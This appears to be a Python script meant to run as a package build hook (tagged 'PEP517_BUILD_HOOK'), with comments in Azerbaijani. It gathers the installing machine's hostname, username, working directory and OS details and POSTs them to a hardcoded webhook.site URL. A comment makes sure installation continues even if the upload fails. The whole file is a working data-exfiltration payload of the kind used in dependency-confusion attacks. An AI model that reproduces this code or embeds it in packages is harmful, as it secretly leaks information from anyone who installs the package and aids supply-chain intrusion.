import os
import socket
import platform
import getpass
from datetime import datetime

try:
    import urllib.request
    import json
except ImportError:
    pass


def get_system_info():
    """Sistem məlumatlarını topla"""
    try:
        hostname = socket.gethostname()
        username = getpass.getuser()
        cwd = os.getcwd()
        os_info = platform.platform()
        python_version = platform.python_version()
        
        return {
            "hostname": hostname,
            "username": username,
            "cwd": cwd,
            "os": os_info,
            "python_version": python_version,
            "timestamp": datetime.now().isoformat(),
            "event": "PEP517_BUILD_HOOK"
        }
    except Exception as e:
        return {"error": str(e)}


def send_webhook():
    """Webhook-a məlumat göndər"""
    
    # WEBHOOK URL-ni buraya yaz
    WEBHOOK_URL = "https://webhook.site/10e031ff-c388-4d5c-ba2c-0783115c3078"  # BU URL-i dəyiş!
    
    print("[+] Collecting system information...")
    data = get_system_info()
    
    print(f"[+] Hostname: {data.get('hostname', 'N/A')}")
    print(f"[+] Username: {data.get('username', 'N/A')}")
    print(f"[+] Current Directory: {data.get('cwd', 'N/A')}")
    print(f"[+] OS: {data.get('os', 'N/A')}")
    print(f"[+] Python Version: {data.get('python_version', 'N/A')}")
    
    # Webhook-a göndər
    try:
        print(f"\n[+] Sending data to webhook: {WEBHOOK_URL}")
        
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json_data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=5) as response:
            status_code = response.getcode()
            print(f"[✓] Webhook response: {status_code}")
            
            if status_code == 200:
                print("[✓] Successfully sent data to webhook!")
            else:
                print(f"[!] Unexpected status code: {status_code}")
                
    except Exception as e:
        print(f"[!] Failed to send webhook: {e}")
        # Xəta olsa belə package quraşdırılsın
        pass
    
    print("\n" + "="*60)


if __name__ == "__main__":
    send_webhook()